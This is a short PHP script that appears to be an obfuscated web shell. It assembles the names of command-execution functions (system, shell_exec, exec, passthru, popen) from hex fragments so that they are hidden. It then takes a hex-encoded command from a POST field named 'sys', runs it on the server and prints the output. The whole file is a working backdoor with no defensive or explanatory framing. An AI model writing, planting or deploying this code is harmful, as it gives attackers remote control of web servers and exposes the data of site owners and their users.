<?php

$attr1 = '73';
$attr2 = '74';
$attr3 = '65';
$attr4 = '63';
$attr5 = '78';
$attr6 = '70';
$attr7 = '68';
$attr8 = '6f';
$attr9 = '6e';
$attr10 = '72';
$attr11 = '5f';
$attr12 = '67';
$attr13 = '6c';
$post1 = pack("H*", '73'.'79'.$attr1.$attr2.$attr3.'6d');
$post2 = pack("H*", '73'.'68'.$attr3.'6c'.'6c'.'5f'.'65'.'78'.'65'.$attr4);
$post3 = pack("H*", $attr3.$attr5.$attr3.$attr4);
$post4 = pack("H*", $attr6.'61'.'73'.$attr1.$attr2.$attr7.'72'.'75');
$post5 = pack("H*", '70'.$attr8.'70'.'65'.$attr9);
$post6 = pack("H*", '73'.'74'.$attr10.$attr3.'61'.'6d'.$attr11.$attr12.'65'.$attr2.'5f'.$attr4.'6f'.'6e'.'74'.$attr3.$attr9.$attr2.$attr1);
$post7 = pack("H*", '70'.'63'.$attr13.$attr8.'73'.$attr3);
$sys = pack("H*", $attr1.'79'.$attr1);
if (isset($_POST[$sys])) {
    $sys = pack("H*", $_POST[$sys]);
    if (function_exists($post1)) {
        $post1($sys);
    } elseif (function_exists($post2)) {
        print $post2($sys);
    } elseif (function_exists($post3)) {
        $post3($sys, $st_arg);
        print join("\n", $st_arg);
    } elseif (function_exists($post4)) {
        $post4($sys);
    } elseif (function_exists($post5) && function_exists($post6) && function_exists($post7)) {
        $parameter_slt = $post5($sys, 'r');
        if ($parameter_slt) {
            $fld_state = $post6($parameter_slt);
            $post7($parameter_slt);
            print $fld_state;
        }
    }
    exit;
}
